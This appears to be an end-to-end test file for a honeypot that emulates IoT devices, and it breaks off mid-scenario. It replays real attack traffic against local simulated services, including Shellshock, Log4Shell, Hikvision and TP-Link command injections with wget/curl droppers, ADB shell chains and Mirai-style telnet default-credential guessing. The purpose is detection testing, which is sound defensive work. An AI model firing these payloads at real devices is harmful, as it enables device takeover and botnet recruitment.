package e2e

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/generalregulator/botbait/internal/abuseipdb"
	"github.com/generalregulator/botbait/internal/alert"
	"github.com/generalregulator/botbait/internal/config"
	"github.com/generalregulator/botbait/internal/downloader"
	"github.com/generalregulator/botbait/internal/metrics"
	"github.com/generalregulator/botbait/internal/model"
	"github.com/generalregulator/botbait/internal/parser"
	"github.com/generalregulator/botbait/internal/payloadstore"
	"github.com/generalregulator/botbait/internal/pipeline"
	"github.com/generalregulator/botbait/internal/profile"
	"github.com/generalregulator/botbait/internal/ratelimit"
	"github.com/generalregulator/botbait/internal/server"
	"github.com/generalregulator/botbait/internal/session"
	"github.com/generalregulator/botbait/internal/store"
)

const simAbuseKey = "SIMULATIONKEYSIMULATIONKEY0123456789"

type abuseReport struct {
	IP         string
	Categories []int
	Comment    string
}

type simEnv struct {
	ports    map[string]int
	label    map[string]int
	mal      *httptest.Server
	malHits  sync.Map
	tgMu     sync.Mutex
	tgMsgs   []string
	abMu     sync.Mutex
	abuse    []abuseReport
	abAuthOK bool
	logDir   string
	cancel   context.CancelFunc
	srvDone  chan struct{}
	pipe     *pipeline.Pipeline
	st       *store.Store
	rep      *abuseipdb.Reporter
	cfg      *config.Config
	m        *metrics.Metrics
}

func (e *simEnv) payloadURL(name string) string { return e.mal.URL + "/" + name }

func startSim(t *testing.T) *simEnv {
	t.Helper()
	e := &simEnv{ports: map[string]int{}, label: map[string]int{}, srvDone: make(chan struct{}), m: &metrics.Metrics{}, abAuthOK: true}

	e.mal = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		n, _ := e.malHits.LoadOrStore(r.URL.Path, new(int))
		*(n.(*int))++
		w.Write(append([]byte("\x7fELF\x01\x01\x01\x00"), bytes.Repeat([]byte("sim:"+r.URL.Path+";"), 40)...))
	}))
	t.Cleanup(e.mal.Close)

	tg := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var body struct{ Text string }
		b, _ := io.ReadAll(r.Body)
		_ = json.Unmarshal(b, &body)
		e.tgMu.Lock()
		e.tgMsgs = append(e.tgMsgs, body.Text)
		e.tgMu.Unlock()
		w.Write([]byte(`{"ok":true}`))
	}))
	t.Cleanup(tg.Close)

	ab := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/api/v2/report" || r.Method != http.MethodPost || r.Header.Get("Key") != simAbuseKey || r.Header.Get("Accept") != "application/json" {
			e.abMu.Lock()
			e.abAuthOK = false
			e.abMu.Unlock()
			w.WriteHeader(http.StatusUnauthorized)
			return
		}
		_ = r.ParseForm()
		var cats []int
		for _, c := range strings.Split(r.PostForm.Get("categories"), ",") {
			if n, err := strconv.Atoi(strings.TrimSpace(c)); err == nil {
				cats = append(cats, n)
			}
		}
		e.abMu.Lock()
		e.abuse = append(e.abuse, abuseReport{IP: r.PostForm.Get("ip"), Categories: cats, Comment: r.PostForm.Get("comment")})
		e.abMu.Unlock()
		w.Write([]byte(`{"data":{"ipAddress":"` + r.PostForm.Get("ip") + `","abuseConfidenceScore":0}}`))
	}))
	t.Cleanup(ab.Close)

	for _, k := range []string{"adb", "tr069", "telnet", "hikvision", "tvt", "dahua"} {
		e.ports[k] = freePort(t)
	}
	e.label = map[string]int{"adb": 5555, "tr069": 7547, "telnet": 23, "hikvision": 80, "tvt": 81, "dahua": 8080}
	tmp := t.TempDir()
	e.logDir = filepath.Join(tmp, "data")
	cfg := &config.Config{
		Ports:       []int{e.ports["adb"], e.ports["tr069"], e.ports["telnet"], e.ports["hikvision"], e.ports["tvt"], e.ports["dahua"]},
		TelnetPorts: []int{e.ports["telnet"]},
		WebPorts:    map[int]string{e.ports["hikvision"]: "hikvision", e.ports["tvt"]: "tvt", e.ports["dahua"]: "dahua"},
		PortLabels: map[int]int{e.ports["adb"]: 5555, e.ports["tr069"]: 7547, e.ports["telnet"]: 23,
			e.ports["hikvision"]: 80, e.ports["tvt"]: 81, e.ports["dahua"]: 8080},
		MaxConns: 256, MaxConnsPerIP: 64, QueueSize: 64,
		ReadTimeout: 600 * time.Millisecond, WriteTimeout: time.Second,
		SessionTimeout: 4 * time.Second, MaxReadBytes: 256 * 1024, ShutdownTimeout: 8 * time.Second,
		RateLimit: 10000, RateBurst: 10000, RatePrefix4: 24, RatePrefix6: 64,
		PipelineWorkers: 4, EventQueue: 256, LogDir: e.logDir, StorePayloadMax: 8192,
		DownloadEnabled: true, PayloadDir: filepath.Join(tmp, "payloads"),
		DownloadTimeout: 2 * time.Second, MaxDownloadBytes: 1 << 20, MaxDownloadsPerEvent: 3,
		DownloadWorkers: 4, MaxStorageBytes: 64 << 20,
		CapturePush: true, MaxPushBytes: 4 << 20, PushSessionTimeout: 10 * time.Second,
		TelegramToken: "1:TOKEN", TelegramChatID: "42", AlertPayloadMax: 1200,
		AbuseKey: simAbuseKey, AbuseReport: true, AbuseBrute: true,
	}
	e.cfg = cfg

	log := slog.New(slog.NewTextHandler(io.Discard, nil))
	st, err := store.Open(cfg.LogDir)
	if err != nil {
		t.Fatal(err)
	}
	e.st = st
	ps, err := payloadstore.New(cfg.PayloadDir, cfg.MaxStorageBytes)
	if err != nil {
		t.Fatal(err)
	}
	dl, err := downloader.New(downloader.Options{
		Store: ps, Dir: cfg.PayloadDir, Timeout: cfg.DownloadTimeout, MaxBytes: cfg.MaxDownloadBytes,
		MaxStorageBytes: cfg.MaxStorageBytes, Workers: cfg.DownloadWorkers, AllowPrivate: true,
	})
	if err != nil {
		t.Fatal(err)
	}
	notifier := alert.NewNotifier("1:TOKEN", "42", tg.URL, 6000, 500, 6*time.Hour, 1200, e.m,
		alert.WithCampaignCooldown(6*time.Hour))
	e.rep = abuseipdb.New(abuseipdb.Options{Key: simAbuseKey, Base: ab.URL, Window: 24 * time.Hour, Metrics: e.m, AllowNonPublic: true})
	ctx, cancel := context.WithCancel(context.Background())
	e.cancel = cancel
	e.rep.Start()
	e.pipe = pipeline.New(pipeline.Deps{Cfg: cfg, Log: log, Metrics: e.m, Download: dl, Notifier: notifier, Store: st, Abuse: e.rep})
	e.pipe.Start()

	tvbox, err := profile.Load("android-tvbox", "sim")
	if err != nil {
		t.Fatal(err)
	}
	router, err := profile.Load("router-busybox", "sim")
	if err != nil {
		t.Fatal(err)
	}
	lim := ratelimit.New(cfg.RateLimit, cfg.RateBurst, cfg.RatePrefix4, cfg.RatePrefix6)
	srv := server.New(cfg, session.New(cfg, e.pipe, e.m, session.WithStore(ps), session.WithProfile(tvbox),
		session.WithTelnetProfile(router), session.WithWebSeed("sim")), lim, e.m, log)
	go func() { _ = srv.Run(ctx); close(e.srvDone) }()

	for _, p := range cfg.Ports {
		deadline := time.Now().Add(3 * time.Second)
		for {
			c, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", p))
			if err == nil {
				c.Close()
				break
			}
			if time.Now().After(deadline) {
				t.Fatalf("port %d never opened", p)
			}
			time.Sleep(20 * time.Millisecond)
		}
	}
	t.Cleanup(cancel)
	return e
}

func (e *simEnv) finish(t *testing.T) []model.Event {
	t.Helper()
	e.cancel()
	select {
	case <-e.srvDone:
	case <-time.After(10 * time.Second):
		t.Fatal("server did not stop")
	}
	e.pipe.Shutdown(8 * time.Second)
	e.rep.Stop(8 * time.Second)
	_ = e.st.Close()
	return readEvents(t, e.logDir)
}

type client struct {
	ip   string
	port int
}

func (c client) dial() (net.Conn, error) {
	d := net.Dialer{Timeout: 2 * time.Second, LocalAddr: &net.TCPAddr{IP: net.ParseIP(c.ip)}}
	return d.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", c.port))
}

func (c client) raw(data []byte, read bool) (string, error) {
	conn, err := c.dial()
	if err != nil {
		return "", err
	}
	defer conn.Close()
	if _, err := conn.Write(data); err != nil {
		return "", err
	}
	if !read {
		return "", nil
	}
	_ = conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	out, _ := io.ReadAll(io.LimitReader(conn, 1<<20))
	return string(out), nil
}

func (c client) http(method, target string, headers map[string]string, body string) (string, error) {
	var b strings.Builder
	fmt.Fprintf(&b, "%s %s HTTP/1.1\r\nHost: 192.0.2.10\r\n", method, target)
	if _, ok := headers["User-Agent"]; !ok {
		b.WriteString("User-Agent: Mozilla/5.0\r\n")
	}
	keys := make([]string, 0, len(headers))
	for k := range headers {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	for _, k := range keys {
		fmt.Fprintf(&b, "%s: %s\r\n", k, headers[k])
	}
	if body != "" || method == "POST" || method == "PUT" {
		fmt.Fprintf(&b, "Content-Length: %d\r\n", len(body))
	}
	b.WriteString("Connection: close\r\n\r\n")
	b.WriteString(body)
	return c.raw([]byte(b.String()), true)
}

type adbConn struct {
	c     net.Conn
	buf   []byte
	local uint32
}

func (c client) adb() (*adbConn, error) {
	conn, err := c.dial()
	if err != nil {
		return nil, err
	}
	a := &adbConn{c: conn, local: 1}
	if err := a.send("CNXN", 0x01000001, 256*1024, []byte("host::features=shell_v2,cmd\x00")); err != nil {
		conn.Close()
		return nil, err
	}
	for i := 0; i < 8; i++ {
		m, err := a.next()
		if err != nil {
			conn.Close()
			return nil, err
		}
		if m.Command == "CNXN" {
			return a, nil
		}
	}
	conn.Close()
	return nil, fmt.Errorf("no CNXN reply")
}

func (a *adbConn) send(cmd string, a0, a1 uint32, p []byte) error {
	_, err := a.c.Write(parser.BuildADB(cmd, a0, a1, p))
	return err
}

func (a *adbConn) next() (parser.ADBMessage, error) {
	for {
		msgs, used, err := parser.ParseADB(a.buf, 1<<20)
		if err != nil {
			return parser.ADBMessage{}, err
		}
		if len(msgs) > 0 {
			var rest []byte
			for _, m := range msgs[1:] {
				rest = append(rest, parser.BuildADB(m.Command, m.Arg0, m.Arg1, m.Payload)...)
			}
			a.buf = append(rest, a.buf[used:]...)
			return msgs[0], nil
		}
		_ = a.c.SetReadDeadline(time.Now().Add(4 * time.Second))
		tmp := make([]byte, 64<<10)
		n, err := a.c.Read(tmp)
		if n == 0 {
			return parser.ADBMessage{}, fmt.Errorf("adb read: %v", err)
		}
		a.buf = append(a.buf, tmp[:n]...)
	}
}

func (a *adbConn) waitFor(cmd string) (parser.ADBMessage, error) {
	for i := 0; i < 200; i++ {
		m, err := a.next()
		if err != nil {
			return m, err
		}
		if m.Command == cmd {
			return m, nil
		}
	}
	return parser.ADBMessage{}, fmt.Errorf("never saw %s", cmd)
}

func (a *adbConn) shell(cmd string) (string, error) {
	a.local++
	if err := a.send("OPEN", a.local, 0, []byte("shell:"+cmd+"\x00")); err != nil {
		return "", err
	}
	var out []byte
	for i := 0; i < 400; i++ {
		m, err := a.next()
		if err != nil {
			return string(out), err
		}
		switch m.Command {
		case "WRTE":
			out = append(out, m.Payload...)
		case "CLSE":
			return string(out), nil
		}
	}
	return string(out), fmt.Errorf("shell never closed")
}

func (a *adbConn) push(path string, data []byte) error {
	a.local++
	if err := a.send("OPEN", a.local, 0, []byte("sync:\x00")); err != nil {
		return err
	}
	ok, err := a.waitFor("OKAY")
	if err != nil {
		return err
	}
	id := ok.Arg0
	spec := path + ",33261"
	if err := a.send("WRTE", a.local, id, syncMsg("SEND", uint32(len(spec)), []byte(spec))); err != nil {
		return err
	}
	for off := 0; off < len(data); off += 64 * 1024 {
		end := min(off+64*1024, len(data))
		if err := a.send("WRTE", a.local, id, syncMsg("DATA", uint32(end-off), data[off:end])); err != nil {
			return err
		}
	}
	if err := a.send("WRTE", a.local, id, syncMsg("DONE", 1700000000, nil)); err != nil {
		return err
	}
	if _, err := a.waitFor("WRTE"); err != nil {
		return err
	}
	if err := a.send("WRTE", a.local, id, syncMsg("QUIT", 0, nil)); err != nil {
		return err
	}
	_, err = a.waitFor("CLSE")
	return err
}

func (a *adbConn) close() { a.c.Close() }

type telnetConn struct {
	c       net.Conn
	log     strings.Builder
	pending bool
}

func (c client) telnet() (*telnetConn, error) {
	conn, err := c.dial()
	if err != nil {
		return nil, err
	}
	return &telnetConn{c: conn}, nil
}

func (t *telnetConn) until(want string) error {
	buf := make([]byte, 2048)
	_ = t.c.SetReadDeadline(time.Now().Add(3 * time.Second))
	var seen strings.Builder
	for !strings.Contains(seen.String(), want) {
		n, err := t.c.Read(buf)
		seen.Write(buf[:n])
		t.log.Write(buf[:n])
		if err != nil {
			return fmt.Errorf("waiting for %q: %v (got %q)", want, err, seen.String())
		}
	}
	return nil
}

func (t *telnetConn) say(s string) error { _, err := t.c.Write([]byte(s + "\r\n")); return err }

func (t *telnetConn) login(user, pass string) (bool, error) {
	if t.pending {
		t.pending = false
	} else if err := t.until("login: "); err != nil {
		return false, err
	}
	if err := t.say(user); err != nil {
		return false, err
	}
	if err := t.until("Password: "); err != nil {
		return false, err
	}
	if err := t.say(pass); err != nil {
		return false, err
	}
	deadline := time.Now().Add(3 * time.Second)
	buf := make([]byte, 2048)
	var seen strings.Builder
	for time.Now().Before(deadline) {
		_ = t.c.SetReadDeadline(time.Now().Add(time.Second))
		n, err := t.c.Read(buf)
		seen.Write(buf[:n])
		t.log.Write(buf[:n])
		s := seen.String()
		if i := strings.Index(s, "Login incorrect"); i >= 0 {
			if strings.Contains(s[i:], "login: ") {
				t.pending = true
				return false, nil
			}
		} else if strings.Contains(s, "# ") || strings.HasSuffix(strings.TrimRight(s, " "), "#") {
			return true, nil
		}
		if err != nil {
			return false, err
		}
	}
	return false, fmt.Errorf("login outcome unclear: %q", seen.String())
}

func (t *telnetConn) run(cmd string) (string, error) {
	if err := t.say(cmd); err != nil {
		return "", err
	}
	buf := make([]byte, 4096)
	var seen strings.Builder
	deadline := time.Now().Add(3 * time.Second)
	for time.Now().Before(deadline) {
		_ = t.c.SetReadDeadline(time.Now().Add(time.Second))
		n, err := t.c.Read(buf)
		seen.Write(buf[:n])
		t.log.Write(buf[:n])
		if strings.HasSuffix(seen.String(), "# ") {
			return seen.String(), nil
		}
		if err != nil {
			return seen.String(), err
		}
	}
	return seen.String(), fmt.Errorf("no prompt after %q", cmd)
}

func (t *telnetConn) close() { t.c.Close() }

func (t *telnetConn) bruteThenShell(creds [][2]string, cmds ...string) error {
	ok := false
	for _, cr := range creds {
		got, err := t.login(cr[0], cr[1])
		if err != nil {
			return err
		}
		if got {
			ok = true
			break
		}
	}
	if !ok {
		return fmt.Errorf("never reached a shell")
	}
	for _, c := range cmds {
		if _, err := t.run(c); err != nil {
			return err
		}
	}
	return t.say("exit")
}

type expect struct {
	alert   bool
	sig     string
	tech    []string
	noTech  bool
	persona string
	iocs    []string
	loot    bool
	creds   bool
	abuse   bool
	cats    []int
}

type scenario struct {
	id, port, title, ref string
	run                  func(e *simEnv, c client) error
	want                 expect
	ipSuffix             int
}

const (
	refMirai  = "Mirai/Gafgyt-style loaders (public source and CERT write-ups)"
	refADB    = "ADB-exposed Android botnets (ADB.Miner, Fbot, Kimwolf-class stagers)"
	refTR069  = "Mirai TR-064/TR-069 variant (SetNTPServers injection on 7547)"
	refHik    = "docs/WEB_PERSONAS.md: Fortinet, SANS ISC, Tenable sources"
	refDahua  = "docs/WEB_PERSONAS.md: Dahua CVE-2021-33044/33045 reporting"
	refWebGen = "Public IoT exploit-kit traffic (jaws, GPON, luci, Apache, PHP-CGI, shellshock)"
	refNoise  = "Internet background noise (crawlers, TLS scanners, banner grabbers)"
)

func sha(s string) string { h := sha256.Sum256([]byte(s)); return hex.EncodeToString(h[:]) }

func buildScenarios() []scenario {
	u := func(e *simEnv, name string) string { return e.payloadURL(name) }
	var out []scenario
	add := func(s scenario) { out = append(out, s) }

	add(scenario{id: "tr069-setntp", port: "tr069", title: "SetNTPServers command injection with wget dropper", ref: refTR069,
		run: func(e *simEnv, c client) error {
			body := `<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"><SOAP-ENV:Body>` +
				"<u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1\"><NewNTPServer1>`cd /tmp;rm -rf *;wget " + u(e, "tr069-setntp.sh") +
				";chmod +x tr069-setntp.sh;sh tr069-setntp.sh`</NewNTPServer1></u:SetNTPServers></SOAP-ENV:Body></SOAP-ENV:Envelope>"
			_, err := c.http("POST", "/UD/act?1", map[string]string{"SOAPAction": "urn:dslforum-org:service:Time:1#SetNTPServers", "User-Agent": "Hello-World"}, body)
			return err
		},
		want: expect{alert: true, tech: []string{"T1190", "T1105", "T1059.004"}, iocs: []string{"tr069-setntp.sh"}, loot: true, abuse: true, cats: []int{15}}})

	add(scenario{id: "tr069-probe", port: "tr069", title: "TR-069 SOAP request to /UD/act?1 with a benign GetInfo (no shell payload)", ref: refTR069,
		run: func(e *simEnv, c client) error {
			body := `<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"><SOAP-ENV:Body><u:GetParameterValues/></SOAP-ENV:Body></SOAP-ENV:Envelope>`
			_, err := c.http("POST", "/UD/act?1", map[string]string{"SOAPAction": "urn:dslforum-org:service:DeviceInfo:1#GetInfo"}, body)
			return err
		},
		want: expect{alert: true, tech: []string{"T1190"}, abuse: true, cats: []int{15}}})

	add(scenario{id: "http-shellshock", port: "tr069", title: "Shellshock in User-Agent with wget dropper", ref: refWebGen,
		run: func(e *simEnv, c client) error {
			_, err := c.http("GET", "/cgi-bin/status.cgi", map[string]string{"User-Agent": `() { :;}; /bin/bash -c "cd /tmp;wget ` + u(e, "shellshock.sh") + `;sh shellshock.sh"`}, "")
			return err
		},
		want: expect{alert: true, tech: []string{"T1190"}, iocs: []string{"shellshock.sh"}, loot: true, abuse: true}})

	add(scenario{id: "http-log4j", port: "tr069", title: "Log4Shell JNDI string in a header", ref: refWebGen,
		run: func(e *simEnv, c client) error {
			_, err := c.http("GET", "/", map[string]string{"X-Api-Version": "${jndi:ldap://203.0.113.77:1389/a}"}, "")
			return err
		},
		want: expect{alert: true, tech: []string{"T1190"}, abuse: true}})

	add(scenario{id: "http-apache-traversal", port: "tr069", title: "Apache 2.4.49 path traversal to /bin/sh (CVE-2021-41773)", ref: refWebGen,
		run: func(e *simEnv, c client) error {
			_, err := c.http("POST", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh", nil, "echo Content-Type: text/plain; echo; cd /tmp; wget "+u(e, "apache.sh")+"; sh apache.sh")
			return err
		},
		want: expect{alert: true, tech: []string{"T1190", "T1105"}, iocs: []string{"apache.sh"}, loot: true, abuse: true}})

	add(scenario{id: "http-phpcgi-b64", port: "tr069", title: "PHP-CGI argument injection (CVE-2024-4577) with base64 stage", ref: refWebGen,
		run: func(e *simEnv, c client) error {
			stage := base64.StdEncoding.EncodeToString([]byte("cd /tmp;wget " + u(e, "phpcgi.sh") + ";sh phpcgi.sh"))
			_, err := c.http("POST", "/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input", nil,
				`<?php shell_exec(base64_decode("`+stage+`")); ?>`)
			return err
		},
		want: expect{alert: true, tech: []string{"T1190"}, iocs: []string{"phpcgi.sh"}, abuse: true}})

	add(scenario{id: "http-jaws", port: "tr069", title: "JAWS /shell?cd+/tmp;wget dropper", ref: refWebGen,
		run: func(e *simEnv, c client) error {
			_, err := c.http("GET", "/shell?cd+/tmp;rm+-rf+*;wget+"+u(e, "jaws.sh")+";sh+/tmp/jaws.sh", nil, "")
			return err
		},
		want: expect{alert: true, tech: []string{"T1190", "T1105"}, iocs: []string{"jaws.sh"}, loot: true, abuse: true}})

	add(scenario{id: "http-luci", port: "tr069", title: "TP-Link luci form=country injection (CVE-2023-1389)", ref: refWebGen,
		run: func(e *simEnv, c client) error {
			_, err := c.http("POST", "/cgi-bin/luci/;stok=/locale?form=country", nil,
				"operation=write&country=$(cd /tmp;wget "+u(e, "luci.sh")+";sh luci.sh)")
			return err
		},
		want: expect{alert: true, tech: []string{"T1190"}, iocs: []string{"luci.sh"}, abuse: true}})

	add(scenario{id: "http-gpon-generic", port: "tr069", title: "GPON diag_Form injection against the generic port (no GPON persona)", ref: refWebGen,
		run: func(e *simEnv, c client) error {
			_, err := c.http("POST", "/GponForm/diag_Form?images/", nil,
				"XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox wget "+u(e, "gpon.sh")+" -O /tmp/g`&ipv=0")
			return err
		},
		want: expect{alert: true, tech: []string{"T1190"}, iocs: []string{"gpon.sh"}, abuse: true}})

	add(scenario{id: "http-crawlers", port: "tr069", title: "Search-engine crawler and common web-scanner probes", ref: refNoise,
		run: func(e *simEnv, c client) error {
			for _, p := range []string{"/", "/robots.txt", "/favicon.ico", "/wp-login.php", "/sitemap.xml"} {
				if _, err := c.http("GET", p, map[string]string{"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1)"}, ""); err != nil {
					return err
				}
			}
			return nil
		},
		want: expect{noTech: true}})

	add(scenario{id: "http-env-probe", port: "tr069", title: "GET /.env secret-file probe (path-only heuristic)", ref: refNoise,
		run:  func(e *simEnv, c client) error { _, err := c.http("GET", "/.env", nil, ""); return err },
		want: expect{alert: true, tech: []string{"T1190"}}})

	add(scenario{id: "noise-tls", port: "tr069", title: "TLS ClientHello on a plain-HTTP port", ref: refNoise,
		run: func(e *simEnv, c client) error {
			hello := append([]byte("\x16\x03\x01\x00\x2f\x01\x00\x00\x2b\x03\x03"), bytes.Repeat([]byte{0x41}, 32)...)
			hello = append(hello, 0x00, 0x00, 0x02, 0x00, 0x2f, 0x01, 0x00)
			_, err := c.raw(hello, true)
			return err
		},
		want: expect{noTech: true}})

	add(scenario{id: "noise-ssh-banner", port: "tr069", title: "SSH banner grab and binary junk", ref: refNoise,
		run: func(e *simEnv, c client) error {
			if _, err := c.raw([]byte("SSH-2.0-libssh_0.9.6\r\n"), true); err != nil {
				return err
			}
			_, err := c.raw([]byte{0x00, 0x01, 0x02, 0xff, 0xfe, 0x80, 0x81, 0x00, 0x00}, true)
			return err
		},
		want: expect{noTech: true}})

	add(scenario{id: "http-multipart-scan", port: "tr069", title: "Generic multipart POST scanner (payload-less, PHP2Shell-style probing)", ref: "Decision recorded in docs: not emulated, logged only",
		run: func(e *simEnv, c client) error {
			body := "--bnd\r\nContent-Disposition: form-data; name=\"probe\"\r\n\r\n1\r\n--bnd--\r\n"
			_, err := c.http("POST", "/index.php", map[string]string{"Content-Type": "multipart/form-data; boundary=bnd"}, body)
			return err
		},
		want: expect{noTech: true}})

	add(scenario{id: "adb-wget-chain", port: "adb", title: "ADB shell: cd /data/local/tmp; wget; chmod; exec", ref: refADB,
		run: func(e *simEnv, c client) error {
			a, err := c.adb()
			if err != nil {
				return err
			}
			defer a.close()
			_, err = a.shell("cd /data/local/tmp; wget " + u(e, "adb-chain.arm7") + " -O x; chmod 777 x; ./x")
			return err
		},
		want: expect{alert: true, tech: []string{"T1059.004", "T1105"}, iocs: []string{"adb-chain.arm7"}, loot: true, abuse: true, cats: []int{15}}})

	add(scenario{id: "adb-curl-pipe", port: "adb", title: "ADB shell: curl | sh", ref: refADB,
		run: func(e *simEnv, c client) error {
			a, err := c.adb()
			if err != nil {
				return err
			}
			defer a.close()
			_, err = a.shell("curl -s " + u(e, "adb-pipe.sh") + " | sh")
			return err
		},
		want: expect{alert: true, tech: []string{"T1059.004", "T1105"}, iocs: []string{"adb-pipe.sh"}, loot: true, abuse: true}})

	add(scenario{id: "adb-push-exec", port: "adb", title: "ADB sync push of an ELF followed by chmod and execution", ref: refADB,
		run: func(e *simEnv, c client) error {
			a, err := c.adb()
			if err != nil {
				return err
			}
			defer a.close()
			bot := append([]byte("\x7fELF\x01\x01\x01\x00"), bytes.Repeat([]byte("sim-adb-push-bot;"), 3000)...)
			if err := a.push("/data/local/tmp/svc", bot); err != nil {
				return err
			}
			if _, err := a.shell("chmod 755 /data/local/tmp/svc"); err != nil {
				return err
			}
			_, err = a.shell("/data/local/tmp/svc &")
			return err
		},
		want: expect{alert: true, tech: []string{"T1059.004"}, loot: true, abuse: true}})

	add(scenario{id: "adb-recon-only", port: "adb", title: "ADB shell: device reconnaissance only", ref: refADB,
		run: func(e *simEnv, c client) error {
			a, err := c.adb()
			if err != nil {
				return err
			}
			defer a.close()
			for _, cmd := range []string{"getprop ro.product.model", "uname -a", "id", "cat /proc/cpuinfo"} {
				if _, err := a.shell(cmd); err != nil {
					return err
				}
			}
			return nil
		},
		want: expect{}})

	add(scenario{id: "adb-miner", port: "adb", title: "ADB shell: Monero miner launch (stratum)", ref: "ADB.Miner (2018) and later Android cryptojacking",
		run: func(e *simEnv, c client) error {
			a, err := c.adb()
			if err != nil {
				return err
			}
			defer a.close()
			_, err = a.shell("cd /data/local/tmp; nohup ./xmrig -o stratum+tcp://pool.example.invalid:3333 -u wallet -p x &")
			return err
		},
		want: expect{alert: true, tech: []string{"T1496"}, abuse: true}})

	add(scenario{id: "adb-handshake-only", port: "adb", title: "ADB port scanner: CNXN then disconnect", ref: refADB,
		run: func(e *simEnv, c client) error {
			a, err := c.adb()
			if err != nil {
				return err
			}
			a.close()
			return nil
		},
		want: expect{noTech: true}})

	add(scenario{id: "adb-http-probe", port: "adb", title: "Plain HTTP GET / on the ADB port", ref: refNoise,
		run:  func(e *simEnv, c client) error { _, err := c.http("GET", "/", nil, ""); return err },
		want: expect{noTech: true}})

	add(scenario{id: "telnet-brute-only", port: "telnet", title: "Telnet default-credential guessing, no shell reached", ref: refMirai,
		run: func(e *simEnv, c client) error {
			t, err := c.telnet()
			if err != nil {
				return err
			}
			defer t.close()
			for _, cr := range [][2]string{{"root", "xc3511"}, {"admin", "admin"}} {
				ok, err := t.login(cr[0], cr[1])
				if err != nil || ok {
					return err
				}
			}
			return nil
		},
		want: expect{creds: true, tech: []string{"T1110.001"}, abuse: true, cats: []int{18}}})

	add(scenario{id: "telnet-mirai-dropper", port: "telnet", title: "Mirai loader: BusyBox probe, wget, chmod, exec", ref: refMirai,
		run: func(e *simEnv, c client) error {
			t, err := c.telnet()
			if err != nil {
				return err
			}
			defer t.close()
			return t.bruteThenShell([][2]string{{"root", "xc3511"}, {"root", "vizxv"}},
				"/bin/busybox ECCHI", "cd /tmp; wget "+u(e, "mirai.mpsl")+"; chmod +x mirai.mpsl; ./mirai.mpsl telnet.sim")
		},
		want: expect{alert: true, tech: []string{"T1110.001", "T1059.004", "T1105"}, iocs: []string{"mirai.mpsl"}, loot: true, creds: true, abuse: true}})

	add(scenario{id: "telnet-isp-defaults", port: "telnet", title: "Telnet with ISP default account, recon then curl dropper", ref: refMirai,
		run: func(e *simEnv, c client) error {
			t, err := c.telnet()
			if err != nil {
				return err
			}
			defer t.close()
			return t.bruteThenShell([][2]string{{"telecomadmin", "admintelecom"}, {"admin", "admin"}},
				"uname -a", "cat /proc/cpuinfo", "curl -s "+u(e, "isp.sh")+" | sh")
		},
		want: expect{alert: true, tech: []string{"T1059.004", "T1105"}, iocs: []string{"isp.sh"}, loot: true, creds: true, abuse: true}})

	add(scenario{id: "telnet-recon-only", port: "telnet", title: "Telnet login then reconnaissance only", ref: refMirai,
		run: func(e *simEnv, c client) error {
			t, err := c.telnet()
			if err != nil {
				return err
			}
			defer t.close()
			return t.bruteThenShell([][2]string{{"root", "root"}, {"root", "root"}}, "cat /proc/cpuinfo", "ls /", "ps")
		},
		want: expect{creds: true, abuse: true, cats: []int{18}}})

	add(scenario{id: "hik-7921-config", port: "hikvision", title: "CVE-2017-7921: configurationFile via auth=YWRtaW46MTEK", ref: refHik,
		run: func(e *simEnv, c client) error {
			_, err := c.http("GET", "/System/configurationFile?auth=YWRtaW46MTEK", nil, "")
			return err
		},
		want: expect{alert: true, sig: "CVE-2017-7921", tech: []string{"T1190"}, persona: "hikvision", abuse: true}})

	add(scenario{id: "hik-7921-users", port: "hikvision", title: "CVE-2017-7921: /Security/users via the bypass token", ref: refHik,
		run: func(e *simEnv, c client) error {
			_, err := c.http("GET", "/Security/users?auth=YWRtaW46MTEK", nil, "")
			return err
		},
		want: expect{alert: true, sig: "CVE-2017-7921", tech: []string{"T1190"}, persona: "hikvision", abuse: true}})

	add(scenario{id: "hik-36260-wget", port: "hikvision", title: "CVE-2021-36260: PUT /SDK/webLanguage with wget stage", ref: refHik,
		run: func(e *simEnv, c client) error {
			_, err := c.http("PUT", "/SDK/webLanguage", nil, `<?xml version="1.0" encoding="UTF-8"?><language>$(wget `+u(e, "hik-36260.arm")+` -O /tmp/x;chmod 777 /tmp/x;/tmp/x hikivision)</language>`)
			return err
		},
		want: expect{alert: true, sig: "CVE-2021-36260", tech: []string{"T1190", "T1105"}, iocs: []string{"hik-36260.arm"}, loot: true, persona: "hikvision", abuse: true}})

	add(scenario{id: "hik-36260-nfs", port: "hikvision", title: "CVE-2021-36260: NFS-mount dropper (no HTTP URL)", ref: "Fortinet Moobot write-up and later NFS variants",
		run: func(e *simEnv, c client) error {
			_, err := c.http("PUT", "/SDK/webLanguage", nil, `<?xml version="1.0" encoding="UTF-8"?><language>$(mount -t nfs -o nolock 203.0.113.9:/srv/share /mnt/x;/mnt/x/run)</language>`)
			return err
		},
		want: expect{alert: true, sig: "CVE-2021-36260", tech: []string{"T1190"}, iocs: []string{"203.0.113.9"}, persona: "hikvision", abuse: true}})

	add(scenario{id: "hik-34067-ldap", port: "hikvision", title: "CVE-2025-34067: applyCT fastjson @type with LDAP URL", ref: refHik,
		run: func(e *simEnv, c client) error {
			_, err := c.http("POST", "/bic/ssoService/v1/applyCT", map[string]string{"Content-Type": "application/json"},
